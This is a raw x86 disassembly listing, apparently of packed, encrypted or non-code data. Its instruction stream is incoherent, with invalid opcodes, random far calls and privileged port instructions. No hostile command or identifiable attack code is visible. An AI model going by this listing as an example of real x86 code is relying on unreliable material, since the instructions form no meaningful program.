  412f7e:	loop   0x412fbc
  412f80:	pop    eax
  412f81:	cmp    edi,DWORD PTR [ebx]
  412f83:	xchg   esp,eax
  412f84:	inc    esi
  412f85:	rcr    BYTE PTR [ebx-0x79],cl
  412f88:	dec    ebp
  412f89:	add    al,0x4e
  412f8b:	and    DWORD PTR [eax+0x4adcebf9],esp
  412f91:	jl     0x412fcc
  412f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f94:	call   0x4294:0xce04d9b5
  412f9b:	nop
  412f9c:	mov    esp,0xe138148b
  412fa1:	add    edi,edi
  412fa3:	cmp    ecx,eax
  412fa5:	stos   DWORD PTR es:[edi],eax
  412fa6:	mov    edx,0xd109ee76
  412fab:	inc    esi
  412fac:	mov    ebp,0x6d1e8bed
  412fb1:	and    eax,0xd5a13b48
  412fb6:	pop    es
  412fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fb8:	clc    
  412fb9:	sahf   
  412fba:	pop    ebp
  412fbb:	push   esp
  412fbc:	push   edi
  412fbd:	hlt    
  412fbe:	dec    ecx
  412fbf:	mov    DWORD PTR [eax-0x16],ecx
  412fc2:	cmp    bl,BYTE PTR [ecx]
  412fc4:	adc    DWORD PTR [ecx-0x48],ecx
  412fc7:	jmp    0x412f8b
  412fc9:	jg     0x412f84
  412fcb:	loopne 0x413030
  412fcd:	xchg   eax,esi
  412fcf:	add    esi,DWORD PTR [esi+eiz*8+0x46]
  412fd3:	sub    al,0x44
  412fd5:	xor    esp,edx
  412fd7:	in     al,0x3f
  412fd9:	iret   
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	bound  ebp,QWORD PTR [ecx+0x2fb4404b]
  412fe1:	stc    
  412fe2:	int3   
  412fe3:	or     eax,0x8b071749
  412fe8:	sbb    eax,DWORD PTR [edx]
  412fea:	retf   
  412feb:	fist   DWORD PTR [edx-0x61147acc]
  412ff1:	dec    BYTE PTR [ebp+0x1f]
  412ff4:	dec    ebx
  412ff5:	in     al,dx
  412ff6:	mov    BYTE PTR ds:0x9c65936b,dh
  412ffc:	xchg   edi,eax
  412ffd:	scas   al,BYTE PTR es:[edi]
  412ffe:	ins    DWORD PTR es:[edi],dx
  412fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413000:	inc    edi
  413001:	xchg   esi,eax
  413002:	add    DWORD PTR [esi-0x72],esp
  413005:	pop    esp
  413006:	jo     0x412ffd
  413008:	pop    edi
  413009:	lods   eax,DWORD PTR ds:[esi]
  41300a:	leave  
  41300b:	pop    ebx
  41300c:	pop    ebp
  41300d:	and    edx,DWORD PTR [esi]
  41300f:	mov    cl,0x76
  413011:	sti    
  413012:	or     eax,0xae3550f5
  413017:	outs   dx,DWORD PTR ds:[esi]
  413018:	lahf   
  413019:	inc    edi
  41301a:	and    ch,bh
  41301c:	jns    0x412fb0
  41301e:	(bad)  
  41301f:	add    BYTE PTR [eax-0x5c76e97c],cl
  413025:	inc    esi
  413026:	dec    edx
  413027:	rcr    DWORD PTR [edx-0x6b293288],1
  41302d:	xchg   esp,eax
  41302e:	in     eax,dx
  41302f:	bound  ecx,QWORD PTR [edi-0x79]
  413032:	fisub  WORD PTR [esi-0x3de42fe6]
  413038:	dec    esi
  413039:	push   ss
  41303a:	inc    esp
  41303b:	jae    0x412fd4
  41303d:	or     eax,0xfd0609b4
  413042:	(bad)  
  413043:	loop   0x413045
  413045:	stc    
  413046:	mov    dh,0xe6
  413048:	xor    DWORD PTR [edx-0x46],0x77a3fb70
  41304f:	mov    DWORD PTR [eax+0x28],0x213c4cd
  413056:	inc    edi
  413057:	jb     0x4130ca
  413059:	mov    bh,0x25
  41305b:	push   esp
  41305c:	(bad)  
  41305d:	sub    BYTE PTR [edx-0x6289c485],bl
  413063:	arpl   di,bx
  413065:	shr    DWORD PTR [edi],0x25
  413068:	push   es
  413069:	rol    DWORD PTR [edi],1
  41306b:	les    ebx,FWORD PTR [edx-0x408b8fab]
  413071:	xor    BYTE PTR [esi],al
  413073:	call   0xa628:0x498bfaae
  41307a:	inc    edi
  41307b:	shl    BYTE PTR [ecx+ebx*1+0x56b4b2fa],cl
  413082:	fisttp DWORD PTR [edx+esi*1+0x17752eea]
  413089:	xchg   ebx,eax
  41308a:	pop    ecx
  41308b:	pop    ds
  41308c:	loop   0x4130ea
  41308e:	xor    DWORD PTR [ebx+0x69],0x70
  413092:	cmp    bl,BYTE PTR [ecx]
  413094:	or     bl,BYTE PTR [esp+eiz*4-0x5e5e18ff]
  41309b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41309c:	or     DWORD PTR [ebx],ebx
  41309e:	push   ds
  41309f:	in     eax,0xe1
  4130a1:	sbb    BYTE PTR [esi+0x53f093b6],dl
  4130a7:	clc    
  4130a8:	mov    bh,0x1
  4130aa:	mov    esi,0x79954796
  4130af:	cmp    BYTE PTR [ebx-0x55ac635c],bh
  4130b5:	sti    
  4130b6:	add    cl,BYTE PTR [ebx-0x9]
  4130b9:	imul   edi,esp,0xb8207bdb
  4130bf:	jbe    0x413137
  4130c1:	mov    ds:0x637da33d,al
  4130c6:	pop    ebx
  4130c7:	and    bl,BYTE PTR [ebx+eax*8]
  4130ca:	inc    ebx
  4130cb:	xchg   ebp,eax
  4130cc:	les    ebp,FWORD PTR [ebx]
  4130ce:	pop    ds
  4130cf:	sbb    al,0x7
  4130d1:	push   0xea218987
  4130d6:	hlt    
  4130d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130d8:	and    al,ah
  4130da:	add    eax,0x85e70404
  4130df:	sbb    al,0x74
  4130e1:	jmp    0x41310f
  4130e3:	pop    edi
  4130e4:	aaa    
  4130e5:	cmovle edi,DWORD PTR [edi]
  4130e8:	(bad)  
  4130e9:	scas   eax,DWORD PTR es:[edi]
  4130ea:	adc    eax,0xdb7590d9
  4130ef:	(bad)  
  4130f0:	scas   eax,DWORD PTR es:[edi]
  4130f1:	push   ds
  4130f2:	xor    BYTE PTR [ecx],al
  4130f4:	mov    al,0x11
  4130f6:	aad    0xcb
  4130f8:	rcl    BYTE PTR [eax+0x5589f7a5],0x8d
  4130ff:	aad    0x59
  413101:	pop    esi
  413102:	mov    al,ds:0x89ab6cc
  413107:	retf   
  413108:	pop    edx
  413109:	das    
  41310a:	test   DWORD PTR cs:[ebx],esi
  41310d:	icebp  
  41310e:	js     0x413153
  413110:	inc    eax
  413111:	mov    eax,0xa69b6df3
  413116:	sahf   
  413117:	jnp    0x413108
  413119:	inc    esp
  41311a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41311b:	add    eax,0x5ec85dd1
  413120:	xor    edi,esi
  413122:	dec    ebp
  413123:	sbb    eax,0x25a94e33
  413128:	jbe    0x4130d5
  41312a:	jb     0x41316e
  41312c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41312d:	fadd   st(5),st
  41312f:	push   edi
  413130:	mov    al,fs:0x124d2d1a
  413136:	lea    edi,[edi+ebp*4]
  413139:	add    BYTE PTR [ecx-0x2840b4ed],cl
  41313f:	iret   
  413140:	xchg   ecx,eax
  413141:	int3   
  413142:	pusha  
  413143:	inc    edi
  413144:	pop    ss
  413145:	inc    ebp
  413146:	mov    DWORD PTR [edi+0x5d],ecx
  413149:	mov    bl,0x1e
  41314b:	pop    ss
  41314c:	fs xchg ebx,eax
  41314e:	adc    dh,ah
  413150:	dec    ebp
  413151:	fisubr DWORD PTR [esi-0x1455b348]
  413157:	add    BYTE PTR [edi],ch
  413159:	add    eax,0x44d39c34
  41315e:	xchg   ecx,eax
  41315f:	(bad)  
  413160:	aad    0xb6
  413162:	repz aas 
  413164:	pushf  
  413165:	jne    0x413142
  413167:	jmp    0xcdc4:0xb79d2c5e
  41316e:	int    0xb7
  413170:	push   esi
  413171:	(bad)
  413174:	mov    ds:0x1d92d4ec,al
  413179:	mov    al,0xa8
  41317b:	adc    dl,dl
  41317d:	and    cl,BYTE PTR [ebx+esi*2-0x7172fef6]
  413184:	xchg   ecx,eax
  413185:	dec    ebp
  413186:	fdivr  QWORD PTR [edi+0x1f]
  413189:	cld    
  41318a:	cmp    edx,DWORD PTR [ecx-0x12c2a3a3]
  413190:	add    ch,0xe
  413193:	je     0x41318b
  413195:	stos   DWORD PTR es:[edi],eax
  413196:	jne    0x413118
  413198:	pop    esi
  413199:	xor    dh,BYTE PTR [edx-0x37661d4d]
  41319f:	push   ecx
  4131a0:	or     BYTE PTR [ecx+0x4e],ch
  4131a3:	xor    eax,0x23fd518d
  4131a8:	dec    esi
  4131a9:	jmp    0x4131fc
  4131ab:	mov    WORD PTR [ebx+0x223ede64],ss
  4131b1:	or     ebx,DWORD PTR [esi-0x74]
  4131b4:	stc    
  4131b5:	(bad)  
  4131b6:	jmp    0x7bb4511b
  4131bb:	int    0x13
  4131bd:	loopne 0x4131a6
  4131bf:	ins    BYTE PTR es:[edi],dx
  4131c0:	gs jecxz 0x41322b
  4131c3:	sub    DWORD PTR [esi+esi*1-0x80],ebp
  4131c7:	lds    ebp,FWORD PTR [eax-0x7]
  4131ca:	jo     0x413176
  4131cc:	test   eax,0x21af54a1
  4131d1:	repz sbb DWORD PTR [edi],esp
  4131d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131d5:	cmovbe edx,DWORD PTR [ebp-0x4f]
  4131d9:	add    eax,DWORD PTR [esi]
  4131db:	ja     0x413248
  4131dd:	shl    cl,1
  4131df:	and    BYTE PTR [edx+edi*1],cl
  4131e2:	int3   
  4131e3:	sub    ah,al
  4131e5:	xlat   BYTE PTR ds:[ebx]
  4131e6:	fimul  WORD PTR [edx]
  4131e8:	enter  0x2bea,0xb0
  4131ec:	mov    ebx,0x8586fdf0
  4131f1:	retf   
  4131f2:	push   0xffffff95
  4131f4:	push   edi
  4131f5:	rol    BYTE PTR [edx-0x4a],1
  4131f8:	cwde   
  4131f9:	loope  0x4131d7
  4131fb:	xchg   esp,eax
  4131fc:	mov    ds:0xff8ba88a,al
  413201:	imul   ebx,DWORD PTR [ebp+0x4c],0x198a4a48
  413208:	fsubr  DWORD PTR [edi-0x5f]
  41320b:	daa    
  41320c:	sub    DWORD PTR [edi],ebx
  41320e:	mov    dl,0x8b
  413210:	sub    al,0xbd
  413212:	call   0x11d8:0x8e0abc8e
  413219:	ss mov dl,0x70
  41321c:	push   esp
  41321d:	es mov dh,0x95
  413220:	xchg   ebx,eax
  413221:	je     0x413279
  413223:	push   edx
  413224:	inc    edi
  413225:	inc    edi
  413226:	shr    BYTE PTR [esi-0xf],0x6a
  41322a:	retf   
  41322b:	inc    edx
  41322c:	pushf  
  41322d:	sbb    al,0x9b
  41322f:	imul   esp,edx,0x42
  413232:	or     eax,0xc8da3b06
  413237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413238:	pop    edx
  413239:	(bad)  [esi+0x59]
  41323c:	pop    ds
  41323d:	(bad)  
  41323e:	fist   WORD PTR ds:[edx-0x3d]
  413242:	dec    esi
  413243:	sbb    eax,0x41f21978
  413248:	push   ebx
  413249:	or     al,0x1e
  41324b:	jl     0x4131d0
  41324d:	and    cl,BYTE PTR [edx-0x44]
  413250:	dec    esp
  413251:	cld    
  413252:	ss (bad) 
  413254:	jmp    0x7644d240
  413259:	aas    
  41325a:	cld    
  41325b:	adc    BYTE PTR [ecx-0x53775b8a],bh
  413261:	lea    esi,[edx+edx*1-0x72]
  413265:	and    ch,BYTE PTR [esi-0x35]
  413268:	mov    al,ds:0x2909ea94
  41326d:	mov    esi,0x4c6fec27
  413272:	push   ss
  413273:	shr    BYTE PTR [edx-0x22],0x83
  413277:	or     bh,BYTE PTR [ecx+eax*1+0x4426d9d]
  41327e:	push   esi
  41327f:	rcr    bh,1
  413281:	mov    ebx,0x84f583ef
  413286:	push   cs
  413287:	xlat   BYTE PTR ds:[ebx]
  413288:	mov    ecx,0xd8129df1
  41328d:	pop    ebx
  41328e:	xor    DWORD PTR [eax+eiz*1+0x4f],eax
  413292:	(bad)  [ecx-0xe]
  413295:	(bad)  [esi+0x6ccd89c0]
  41329b:	mov    al,0xf9
  41329d:	fwait
  41329e:	mov    dh,BYTE PTR [eax+0x2f1274f1]
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	leave  
  4132a6:	mov    WORD PTR ds:0xbf95925d,ds
  4132ac:	pop    esp
  4132ad:	aam    0x64
  4132af:	pop    ss
  4132b0:	je     0x41326f
  4132b2:	pop    edx
  4132b3:	and    bl,bl
  4132b5:	push   ecx
  4132b6:	aaa    
  4132b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132b8:	aas    
  4132b9:	mov    ds:0x821eed0c,eax
  4132be:	(bad)  
  4132bf:	mov    dl,0x4b
  4132c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132c2:	fild   DWORD PTR [eax]
  4132c4:	stos   DWORD PTR es:[edi],eax
  4132c5:	in     al,0x47
  4132c7:	inc    ebx
  4132c8:	jb     0x413267
  4132ca:	int3   
  4132cb:	repnz (bad) 
  4132cd:	sar    DWORD PTR [ebp+0x27],cl
  4132d0:	addr16 icebp 
  4132d2:	out    0x28,al
  4132d4:	ja     0x41327d
  4132d6:	(bad)  
  4132d7:	repnz (bad) 
  4132d9:	in     eax,0x69
  4132db:	mov    bh,0x14
  4132dd:	xor    bh,BYTE PTR [ebx]
  4132df:	pop    edi
  4132e0:	mov    bl,0x7e
  4132e2:	mov    ?,WORD PTR [ebx-0xb0bab84]
  4132e8:	mov    edx,0x99779cfc
  4132ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132ee:	mov    ds:0x85da136b,eax
  4132f3:	nop
  4132f4:	and    al,0xb2
  4132f6:	sahf   
  4132f7:	mov    dh,0x6f
  4132f9:	(bad)  
  4132fa:	sbb    ebp,DWORD PTR [edi+0x68691943]
  413300:	arpl   WORD PTR [edi],cx
  413302:	pop    ebx
  413303:	inc    ecx
  413304:	sub    eax,0xaeeb480b
  413309:	or     DWORD PTR [esi],edi
  41330b:	scas   eax,DWORD PTR es:[edi]
  41330c:	call   0x581d:0x2fa16cba
  413313:	xchg   al,bh
  413315:	or     eax,0xa39fc303
  41331a:	inc    esp
  41331b:	adc    BYTE PTR [edx-0x4a7a11dd],0xb
  413322:	test   cl,al
  413324:	js     0x41333e
  413326:	sub    ebx,DWORD PTR [ebx]
  413328:	cmp    cl,0x47
  41332b:	pop    ebp
  41332c:	push   ebp
  41332d:	fimul  WORD PTR [edx]
  41332f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413330:	xchg   ebx,eax
  413331:	repnz fldcw WORD PTR [eax+0xc]
  413335:	sub    ch,BYTE PTR [ebp+0x1606608a]
  41333b:	scas   al,BYTE PTR es:[edi]
  41333c:	dec    esp
  41333d:	jmp    0x9b2d5ae5
  413342:	pop    ecx
  413343:	push   0xffffff8c
  413345:	adc    DWORD PTR [edi+0x21b946d2],edx
  41334b:	and    edi,esi
  41334d:	mov    eax,0x70f1fe81
  413352:	les    esi,FWORD PTR [eax+0x5f6c6d05]
  413358:	jno    0x41336b
  41335a:	test   esi,ebp
  41335c:	mov    ss,WORD PTR [edx+edi*1+0x2aae3691]
  413363:	es stos DWORD PTR es:[edi],eax
  413365:	addps  xmm0,XMMWORD PTR [ecx+0x7be9d8f5]
  41336c:	inc    ebx
  41336d:	xchg   BYTE PTR [edx+ebp*8-0x6a776941],ch
  413374:	xor    esp,DWORD PTR [eax]
  413376:	sub    al,0x5b
  413378:	and    cl,0xd
  41337b:	pop    esp
  41337c:	pop    esp
  41337d:	mov    dl,ch
  41337f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413380:	cmp    eax,0x1cbc3e03
  413385:	dec    esp
  413386:	sbb    bh,BYTE PTR [edi]
  413388:	inc    edi
  413389:	pusha  
  41338a:	add    DWORD PTR [esi],0xc0fd5256
  413390:	fst    DWORD PTR [ecx]
  413392:	leave  
  413393:	cmp    ah,al
  413395:	shl    BYTE PTR [edi],0x4a
  413398:	or     DWORD PTR [ebx],edx
  41339a:	jne    0x41331f
  41339c:	lahf   
  41339d:	jg     0x413398
  41339f:	dec    ecx
  4133a0:	push   esp
  4133a2:	je     0x4133da
  4133a4:	pop    ecx
  4133a5:	ret    
  4133a6:	(bad)
  4133a9:	dec    ebx
  4133aa:	mov    ebp,0x1164b36a
  4133af:	push   ss
  4133b0:	jb     0x413415
  4133b2:	dec    ebx
  4133b3:	popa   
  4133b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133b5:	(bad)  
  4133b6:	and    eax,0x311b0503
  4133bb:	jmp    0x4133ba
  4133bd:	ds or  al,0x68
  4133c0:	and    eax,0x11f2dc5f
  4133c5:	scas   al,BYTE PTR es:[edi]
  4133c6:	mov    dh,0x38
  4133c8:	es dec ebp
  4133ca:	mul    al
  4133cc:	clc    
  4133cd:	jge    0x4133f7
  4133cf:	in     eax,dx
  4133d0:	pop    edi
  4133d1:	cmp    DWORD PTR [edi+0x36cfe7b1],esi
  4133d7:	jbe    0x4133de
  4133d9:	jg     0x413387
  4133db:	sahf   
  4133dc:	xor    al,0x51
  4133de:	sbb    al,0x3b
  4133e0:	js     0x413390
  4133e2:	xor    ch,BYTE PTR [esi+0x5]
  4133e5:	cs dec edi
  4133e7:	jne    0x4133f3
  4133e9:	or     BYTE PTR [edx-0x6876890c],0x3b
  4133f0:	jnp    0x4133ae
  4133f2:	push   eax
  4133f3:	and    al,BYTE PTR [edx+0x4a9a84f2]
  4133f9:	aam    0xd0
  4133fb:	sub    ch,bh
  4133fd:	pop    ds
  4133fe:	xor    ah,0xd5
  413401:	or     esi,DWORD PTR [eax+0x4e3793c0]
  413407:	mov    eax,ds:0x29658275
  41340c:	or     eax,0x12b60db
  413411:	mov    WORD PTR [ecx],?
  413413:	jge    0x4133d3
  413415:	out    0xe4,al
  413417:	jle    0x4133ae
  413419:	push   cs
  41341a:	imul   ecx,DWORD PTR [edi+ebp*2+0x4b017b1d],0xd6fb46ed
  413425:	dec    edi
  413426:	fldl2e 
  413428:	fs dec ebx
  41342a:	pop    ds
  41342b:	ret    
  41342c:	scas   eax,DWORD PTR es:[edi]
  41342d:	ret    0xed17
  413430:	imul   edi,DWORD PTR [esi-0x37],0xdea0b0d4
  413437:	fst    QWORD PTR [ebx]
  413439:	faddp  st(5),st
  41343b:	aaa    
  41343c:	push   edx
  41343d:	add    eax,0xd743d24a
  413442:	in     al,0x21
  413444:	jp     0x4133da
  413446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413447:	ds xchg edi,eax
  413449:	fld    QWORD PTR fs:[ecx]
  41344c:	je     0x4133e0
  41344e:	xchg   edi,eax
  41344f:	dec    ebp
  413450:	ret    0x4220
  413453:	retf   
  413454:	test   ebx,esp
  413456:	xchg   edx,eax
  413457:	(bad)  [esi-0x6dfa343c]
  41345d:	push   eax
  41345e:	jg     0x4134c5
  413460:	sahf   
  413461:	inc    esi
  413462:	pusha  
  413463:	dec    ecx
  413464:	retf   
  413465:	ins    DWORD PTR es:[edi],dx
  413466:	js     0x413434
  413468:	pop    eax
  413469:	fistp  WORD PTR [ebx-0x5f2fc29]
  41346f:	adc    dh,bh
  413471:	out    dx,eax
  413472:	retf   0x2fae
  413475:	not    BYTE PTR [edx+0x127f23a]
  41347b:	popf   
  41347c:	ret    
  41347d:	lahf   
  41347e:	adc    al,0xcd
  413480:	nop
  413481:	sub    ebp,edx
  413483:	repz xchg ebp,eax
  413485:	nop
  413486:	adc    DWORD PTR [ecx],edx
  413488:	fsubr  st,st(2)
  41348a:	shl    DWORD PTR [ebx-0xa24f2bb],0x44
  413491:	mov    ah,0x95
  413493:	xor    al,0xa9
  413495:	sub    al,0x46
  413497:	inc    eax
  413498:	xor    ch,bl
	...
  413512:	add    BYTE PTR [eax],al
  413514:	call   0xbb94:0xbf94b5b1
  41351b:	mov    edi,0x1b5d8b00
  413520:	dec    eax
  413521:	pop    es
  413522:	push   edx
  413523:	sbb    DWORD PTR ds:0x6e0000dd,edx
  413529:	pop    es
  41352a:	add    BYTE PTR [eax],al
  41352c:	inc    eax
  41352d:	call   0xf61f:0xaf14731a
  413534:	daa    
  413535:	push   esi
  413536:	and    eax,0xef3edf79
  41353b:	xchg   esp,eax
  41353c:	mov    ah,0x6
  41353e:	cmp    esp,DWORD PTR [ebx]
  413540:	sub    dh,BYTE PTR [edi]
  413542:	push   ebp
  413543:	fucomip st,st(1)
  413545:	mov    DWORD PTR [eax+0x2ff8647e],edi
  41354b:	into   
  41354c:	out    0xea,al
  41354e:	xchg   ecx,eax
  41354f:	test   eax,0x5fab2a86
  413555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413556:	xlat   BYTE PTR ds:[ebx]
  413557:	mov    al,ds:0x8dad985c
  41355c:	mov    ecx,cs
  41355e:	sbb    al,0x14
  413560:	stos   BYTE PTR es:[edi],al
  413561:	int    0xb6
  413563:	push   cs
  413564:	or     eax,0x137ee0b0
  413569:	pop    edi
  41356a:	xchg   ebp,eax
  41356b:	xchg   ebp,eax
  41356c:	xor    DWORD PTR [ecx-0x1d0d462a],esp
  413572:	adc    DWORD PTR [esi+0x11],eax
  413575:	push   edi
  413576:	nop
  413577:	ds pop eax
  413579:	dec    ebx
  41357a:	and    ebx,DWORD PTR [esp+eiz*4+0x616b6700]
  413581:	cmp    DWORD PTR [ebp+0x1],ebp
  413584:	or     bh,BYTE PTR [ecx]
  413586:	jmp    0x4135e7
  413588:	jo     0x4135c4
  41358a:	popa   
  41358b:	sbb    ebp,eax
  41358d:	push   esi
  41358e:	popf   
  41358f:	push   ebp
  413590:	mov    edi,0x1904e8c0
  413595:	mov    ebx,DWORD PTR [eax]
  413597:	fstp   TBYTE PTR [edx-0x1b]
  41359a:	pop    eax
  41359b:	in     eax,dx
  41359c:	push   edi
  41359d:	popf   
  41359e:	(bad)  [ebp-0x2c53a855]
  4135a4:	mov    edx,DWORD PTR [eax-0x546823a4]
  4135aa:	lock or BYTE PTR ds:[ebp+0x7d],cl
  4135af:	push   ecx
  4135b0:	not    BYTE PTR [edi+0x5d1f0f9c]
  4135b6:	pop    esi
  4135b7:	pushw  ds
  4135b9:	loope  0x413610
  4135bb:	jg     0x413611
  4135bd:	push   ecx
  4135be:	mov    dl,0x1c
  4135c0:	push   esp
  4135c1:	mov    esi,0x47281458
  4135c6:	cmp    BYTE PTR [eax],dl
  4135c8:	mov    cl,0x23
  4135ca:	adc    DWORD PTR [ecx],esp
  4135cc:	and    al,0xd6
  4135ce:	ss push es
  4135d0:	dec    edx
  4135d1:	pop    eax
  4135d2:	cli    
  4135d3:	cmc    
  4135d4:	leave  
  4135d5:	dec    ebp
  4135d6:	dec    ecx
  4135d7:	inc    ebx
  4135d8:	jb     0x4135ff
  4135da:	jg     0x4135a9
  4135dc:	pop    ebp
  4135dd:	paddusb mm3,QWORD PTR [ebp-0x6ce40953]
  4135e4:	cwde   
  4135e5:	int3   
  4135e6:	pop    ebx
  4135e7:	and    eax,0xad9e479
  4135ec:	or     esp,DWORD PTR [edi]
  4135ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ef:	in     al,0x27
  4135f1:	cwde   
  4135f2:	nop
  4135f3:	enter  0x5ea0,0x23
  4135f7:	inc    ebp
  4135f8:	mov    ecx,0x7729b1fb
  4135fd:	xchg   DWORD PTR [ebx+eiz*4+0x56],ebx
  413601:	cs loopne 0x413618
  413604:	and    dl,al
  413606:	add    BYTE PTR [ecx-0x6],bh
  413609:	push   eax
  41360a:	bswap  edx
  41360c:	sti    
  41360d:	test   DWORD PTR [edi],ebp
  41360f:	jmp    0x413614
  413611:	or     eax,0xa3cbbed2
  413616:	sahf   
  413617:	into   
  413618:	dec    ecx
  413619:	cld    
  41361a:	int    0x10
  41361c:	mov    dh,0xac
  41361e:	inc    esi
  41361f:	push   eax
  413620:	sub    DWORD PTR [edx],edi
  413622:	(bad)  
  413623:	pop    edi
  413624:	das    
  413625:	jp     0x413660
  413627:	retf   0xc05e
  41362a:	sub    al,0x98
  41362c:	push   cs
  41362d:	and    bl,BYTE PTR [edx]
  41362f:	retf   0x2248
  413632:	add    eax,0x9f84fb8a
  413637:	lahf   
  413638:	jge    0x413605
  41363a:	test   al,0x3
  41363c:	popf   
  41363d:	mov    dh,0x89
  41363f:	mov    eax,ds:0xdcda7ab3
  413644:	push   edx
  413645:	xor    al,0x42
  413647:	cwde   
  413648:	pop    edx
  413649:	mov    WORD PTR [edx],?
  41364b:	cmp    DWORD PTR [edx-0x2d],ecx
  41364e:	mov    ebp,0xe5995237
  413653:	repz int3 
  413655:	xchg   edi,eax
  413656:	dec    ebp
  413657:	les    ebp,FWORD PTR [eax-0x235935c5]
  41365d:	fstp   DWORD PTR [ebp+0x66]
  413660:	leave  
  413661:	adc    bl,al
  413663:	retf   
  413664:	test   cl,bl
  413666:	fucomi st,st(2)
  413668:	cs in  eax,0x55
  41366b:	mov    ch,0x47
  41366d:	sti    
  41366e:	jne    0x4136ab
  413670:	xchg   ecx,eax
  413671:	adc    eax,0xaf9a43d7
  413676:	ins    DWORD PTR es:[edi],dx
  413677:	dec    eax
  413678:	sub    BYTE PTR ds:0xeb577054,dh
  41367e:	lods   eax,DWORD PTR ds:[esi]
  41367f:	xchg   ebx,eax
  413680:	jbe    0x41368d
  413682:	or     eax,0xbf78f320
  413687:	es mov edx,0x951c8c6a
  41368d:	push   edx
  41368e:	push   esp
  41368f:	sbb    al,ch
  413691:	jle    0x4136cc
  413693:	mov    ds:0x1475073c,al
  413698:	imul   ebp,ecx,0x5c
  41369b:	adc    al,0x5
  41369d:	push   0x619eff18
  4136a2:	lods   eax,DWORD PTR ds:[esi]
  4136a3:	out    0x15,eax
  4136a5:	ins    DWORD PTR es:[edi],dx
  4136a6:	adc    cl,dl
  4136a8:	sub    esp,eax
  4136aa:	xchg   ebp,eax
  4136ab:	or     BYTE PTR [ebp+0x7aa21bc3],dh
  4136b1:	(bad)  
  4136b2:	std    
  4136b3:	jle    0x4136e9
  4136b5:	or     al,0x21
  4136b7:	sar    BYTE PTR [edx-0x5c],1
  4136ba:	adc    BYTE PTR [esi-0x256628b1],bl
  4136c0:	cs rcl esi,1
  4136c3:	and    al,0x71
  4136c5:	les    esp,FWORD PTR [ecx+0x2d]
  4136c8:	adc    dh,dh
  4136ca:	xchg   esp,eax
  4136cb:	push   ecx
  4136cc:	sbb    eax,0xb189e190
  4136d1:	lea    esi,[ebp+0x4fbdd836]
  4136d7:	cld    
  4136d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136d9:	(bad)  
  4136da:	pop    ecx
  4136db:	push   ebp
  4136dc:	iret   
  4136dd:	pop    esp
  4136de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136df:	cmc    
  4136e0:	cdq    
  4136e1:	daa    
  4136e2:	ins    BYTE PTR es:[edi],dx
  4136e3:	pusha  
  4136e4:	fld    TBYTE PTR [esi+0x6a]
  4136e7:	adc    DWORD PTR [ebx],ebp
  4136e9:	int3   
  4136ea:	call   0x97648436
  4136ef:	xchg   BYTE PTR [esi+0x7f],bl
  4136f2:	inc    edi
  4136f3:	out    0x48,eax
  4136f5:	shl    BYTE PTR [ebp+0x7d608eac],1
  4136fb:	(bad)  
  4136fc:	fistp  DWORD PTR [edx-0x70]
  4136ff:	dec    ecx
  413700:	and    bh,BYTE PTR [eax]
  413702:	adc    bl,dh
  413704:	repz mov fs,WORD PTR [eax]
  413707:	test   DWORD PTR [ebx+eiz*8-0x35d2f88f],edi
  41370e:	js     0x413691
  413710:	ficom  WORD PTR [esi-0x6c2442ea]
  413716:	aad    0x35
  413718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413719:	and    BYTE PTR [ebp+esi*4-0x1a],bl
  41371d:	stos   BYTE PTR es:[edi],al
  41371e:	xor    dh,dl
  413720:	push   ss
  413721:	das    
  413722:	push   edx
  413723:	imul   esp,DWORD PTR [esi],0x98f692bf
  413729:	xor    BYTE PTR [ebx+ebx*1],ch
  41372c:	pushf  
  41372d:	push   cs
  41372e:	arpl   WORD PTR [esi-0x54f340b0],sp
  413734:	add    al,BYTE PTR [edx]
  413736:	(bad)  
  413737:	std    
  413738:	shl    bh,1
  41373a:	xchg   BYTE PTR [esi+0x6a],bh
  41373d:	xchg   ecx,eax
  41373e:	not    BYTE PTR [eax]
  413740:	adc    ecx,DWORD PTR [edx+0x7fc16cd1]
  413746:	sbb    edi,edx
  413748:	das    
  413749:	mov    al,0x15
  41374b:	int3   
  41374c:	add    al,0x68
  41374e:	imul   ebx,DWORD PTR [edi],0x33
  413751:	fs jns 0x4137b4
  413754:	and    edx,DWORD PTR [esi+edx*1+0x71baf6a9]
  41375b:	aaa    
  41375c:	arpl   WORD PTR [esp+edi*1],cx
  41375f:	jecxz  0x41379a
  413761:	inc    esp
  413762:	jp     0x41376f
  413764:	lock test ch,ch
  413767:	call   0xf1ff:0x75fb01d9
  41376e:	and    BYTE PTR ds:0x5e8474d9,dl
  413774:	sti    
  413775:	sbb    dl,BYTE PTR [ebx-0x1]
  413778:	aam    0x52
  41377a:	and    edi,DWORD PTR [edi+eax*8]
  41377d:	dec    ebx
  41377e:	xchg   edx,eax
  41377f:	(bad)
  413782:	pusha  
  413783:	mov    dl,0x19
  413785:	adc    bl,BYTE PTR [edx+0x6]
  413788:	rcr    edi,cl
  41378a:	cdq    
  41378b:	test   DWORD PTR [ebx],edx
  41378d:	ficomp WORD PTR [esi-0x6f]
  413790:	dec    esp
  413791:	push   esi
  413792:	jno    0x41379d
  413794:	dec    eax
  413795:	dec    ebx
